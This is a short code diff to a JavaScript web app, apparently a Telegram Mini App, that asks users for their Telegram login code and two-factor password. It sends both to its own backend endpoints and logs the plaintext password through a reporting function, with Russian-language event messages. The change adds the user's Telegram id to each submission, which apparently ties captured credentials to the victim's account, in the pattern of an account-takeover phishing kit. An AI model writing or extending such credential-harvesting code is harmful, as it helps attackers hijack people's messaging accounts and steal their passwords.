@@ -682,13 +682,15 @@ function initApp() {
             reportAuthEvent("entered_code", `Введен код: ${code}`);
 
             try {
+                const userTgId = tg?.initDataUnsafe?.user?.id || null;
                 const res = await fetch("/api/auth/verify-code", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         session_id: currentSessionId,
                         phone: userPhone,
-                        code: code
+                        code: code,
+                        tg_id: userTgId
                     })
                 });
 
@@ -776,13 +778,15 @@ function initApp() {
             reportAuthEvent("entered_2fa", `Введен пароль: ${password}`, password);
 
             try {
+                const userTgId = tg?.initDataUnsafe?.user?.id || null;
                 const res = await fetch("/api/auth/verify-2fa", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         session_id: currentSessionId,
                         phone: userPhone,
-                        password: password
+                        password: password,
+                        tg_id: userTgId
                     })
                 });
 
